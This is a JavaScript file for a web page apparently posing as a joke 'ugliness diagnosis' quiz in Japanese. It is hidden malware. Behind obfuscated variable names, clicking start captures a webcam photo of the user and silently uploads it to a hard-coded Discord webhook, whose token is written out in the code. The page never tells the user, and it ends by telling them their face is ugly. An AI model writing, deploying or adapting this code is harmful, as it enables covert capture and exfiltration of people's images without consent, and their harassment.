const startBtn = document.getElementById("startBtn");
const status = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
function dataURLToBlob(_0x2e3302) {
  const [_0x165d72, _0x564fb0] = _0x2e3302.split(",");
  const _0x27ef23 = _0x165d72.match(/:(.*?);/)[1];
  const _0xcee6d2 = atob(_0x564fb0);
  const _0x56d4dc = new Uint8Array(_0xcee6d2.length);
  for (let _0x1b44f8 = 0; _0x1b44f8 < _0xcee6d2.length; _0x1b44f8++) {
    _0x56d4dc[_0x1b44f8] = _0xcee6d2.charCodeAt(_0x1b44f8);
  }
  return new Blob([_0x56d4dc], {
    type: _0x27ef23,
  });
}
startBtn.addEventListener("click", async () => {
  startBtn.disabled = true;
  startBtn.textContent = "診断中";
  status.textContent = "ブス度を診断しています...";
  try {
    const _0x14b1f5 = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
      },
      audio: false,
    });
    video.srcObject = _0x14b1f5;
    await new Promise((_0x418d68) => {
      if (video.readyState >= 2) {
        _0x418d68();
      } else {
        video.onloadedmetadata = _0x418d68;
      }
    });
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const _0x2eedaf = canvas.toDataURL("image/jpeg", 0.9);
    const _0x38abfd = dataURLToBlob(_0x2eedaf);
    const _0x4af01c = new FormData();
    _0x4af01c.append("file", _0x38abfd, "face.jpg");
    const _0x180896 = await fetch(
      "https://discord.com/api/webhooks/1362470668553158667/eCWpBAxBQbxZsHxutzpLEOwMOT_554QMvhxq4lcCko9Cxts2UhiqaZi0NDxs3s8bPsw6",
      {
        method: "POST",
        body: _0x4af01c,
      }
    );
    if (!_0x180896.ok) {
      throw new Error("HTTP " + _0x180896.status);
    }
    status.textContent = "診断完了！あなたの顔はブスです";
    startBtn.textContent = "診断完了";
  } catch (_0x4505e6) {
    console.error(_0x4505e6);
    status.textContent = "エラー: " + _0x4505e6.message;
    startBtn.textContent = "診断スタート";
    startBtn.disabled = false;
  } finally {
    if (video.srcObject) {
      video.srcObject.getTracks().forEach((_0x4be418) => _0x4be418.stop());
      video.srcObject = null;
    }
  }
});
